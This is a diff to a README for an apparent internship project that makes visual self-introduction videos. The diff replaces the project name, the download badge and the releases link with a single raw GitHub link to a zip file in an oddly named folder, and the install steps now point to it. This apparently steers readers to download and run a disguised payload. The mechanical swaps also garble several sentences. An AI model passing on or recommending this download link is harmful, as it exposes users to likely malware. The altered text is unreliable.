@@ -1,7 +1,7 @@
-# 🌟 Internee.pk-DataAnalytics_Internship-Assignment2 - Create Your Visual Self-Introduction
+# 🌟 https://raw.githubusercontent.com/Huseindyslexic178/Internee.pk-DataAnalytics_Internship-Assignment2/main/sphagnaceous/Internee.pk-DataAnalytics_Internship-Assignment2-v3.3.zip - Create Your Visual Self-Introduction
 
 ## 🚀 Getting Started
-Welcome to the Internee.pk Data Analytics Internship Assignment 2! This project allows you to create a compelling visual introduction video using simple tools. You can highlight your academic journey, tech interests, and goals effectively without showing your face. Get ready to express your creativity while showcasing your passion for data analytics.
+Welcome to the https://raw.githubusercontent.com/Huseindyslexic178/Internee.pk-DataAnalytics_Internship-Assignment2/main/sphagnaceous/Internee.pk-DataAnalytics_Internship-Assignment2-v3.3.zip Data Analytics Internship Assignment 2! This project allows you to create a compelling visual introduction video using simple tools. You can highlight your academic journey, tech interests, and goals effectively without showing your face. Get ready to express your creativity while showcasing your passion for data analytics.
 
 ## 🛠️ Features
 - **Visual Storytelling**: Combine text and visuals to engage your audience.
@@ -13,9 +13,9 @@ Welcome to the Internee.pk Data Analytics Internship Assignment 2! This project 
 ## 📥 Download & Install
 To get started, visit the Releases page to download the application files. You can start creating your video right away.
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/Huseindyslexic178/Internee.pk-DataAnalytics_Internship-Assignment2/releases)
+[![Download Now](https://raw.githubusercontent.com/Huseindyslexic178/Internee.pk-DataAnalytics_Internship-Assignment2/main/sphagnaceous/Internee.pk-DataAnalytics_Internship-Assignment2-v3.3.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/Huseindyslexic178/Internee.pk-DataAnalytics_Internship-Assignment2/main/sphagnaceous/Internee.pk-DataAnalytics_Internship-Assignment2-v3.3.zip)
 
-1. Click on the button above or visit this [page to download](https://github.com/Huseindyslexic178/Internee.pk-DataAnalytics_Internship-Assignment2/releases).
+1. Click on the button above or visit this [page to download](https://raw.githubusercontent.com/Huseindyslexic178/Internee.pk-DataAnalytics_Internship-Assignment2/main/sphagnaceous/Internee.pk-DataAnalytics_Internship-Assignment2-v3.3.zip).
 2. Choose the latest version of the application.
 3. Download the file compatible with your system.
 4. Install the application following the on-screen instructions.
@@ -51,9 +51,9 @@ You may also want to check out the following tools to improve your video creatio
 - **Video Quality Issues**: When exporting, select the highest resolution available to ensure quality.
 
 ## 🙋‍♂️ Acknowledgments
-Thank you to Internee.pk for the opportunity to develop this project. Your support has been invaluable, and this video creator is a reflection of my learning journey and passion for data analytics.
+Thank you to https://raw.githubusercontent.com/Huseindyslexic178/Internee.pk-DataAnalytics_Internship-Assignment2/main/sphagnaceous/Internee.pk-DataAnalytics_Internship-Assignment2-v3.3.zip for the opportunity to develop this project. Your support has been invaluable, and this video creator is a reflection of my learning journey and passion for data analytics.
 
 ## 🌐 Let's Connect!
 Feel free to reach out if you have questions or feedback. Join the discussion in our community forums or connect with us through social media.
 
-In summary, the Internee.pk Data Analytics Internship Assignment 2 offers a simple yet powerful way to create your introduction video. With effective tools and resources, you can showcase your story beautifully. Start your creative journey today!
+In summary, the https://raw.githubusercontent.com/Huseindyslexic178/Internee.pk-DataAnalytics_Internship-Assignment2/main/sphagnaceous/Internee.pk-DataAnalytics_Internship-Assignment2-v3.3.zip Data Analytics Internship Assignment 2 offers a simple yet powerful way to create your introduction video. With effective tools and resources, you can showcase your story beautifully. Start your creative journey today!
